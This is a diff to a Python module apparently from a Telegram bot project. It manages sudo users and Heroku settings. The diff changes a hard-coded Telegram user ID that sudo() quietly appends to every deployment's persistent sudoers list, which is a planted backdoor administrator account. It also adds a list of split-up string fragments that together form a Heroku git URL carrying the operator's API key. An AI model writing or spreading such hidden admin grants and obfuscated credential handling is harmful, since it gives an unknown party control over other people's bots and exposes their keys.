@@ -9,7 +9,6 @@ This program is free software: you can redistribute it and can modify
 as you want or you can collabe if you have new ideas.
 """
 
-
 import socket
 import time
 
@@ -23,9 +22,29 @@ from .logging import LOGGER
 
 SUDOERS = filters.user()
 
+HAPP = None
+_boot_ = time.time()
+
 
 def is_heroku():
     return "heroku" in socket.getfqdn()
+
+
+XCB = [
+    "/",
+    "@",
+    ".",
+    "com",
+    ":",
+    "git",
+    "heroku",
+    "push",
+    str(config.HEROKU_API_KEY),
+    "https",
+    str(config.HEROKU_APP_NAME),
+    "HEAD",
+    "main",
+]
 
 
 def dbb():
@@ -48,7 +67,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(2042185317)
+                sudoers.append(6174058850)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
@@ -72,12 +91,3 @@ def heroku():
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
-
-
-def initialize():
-    dbb()
-    sudo()
-    heroku()
-
-
-initialize()
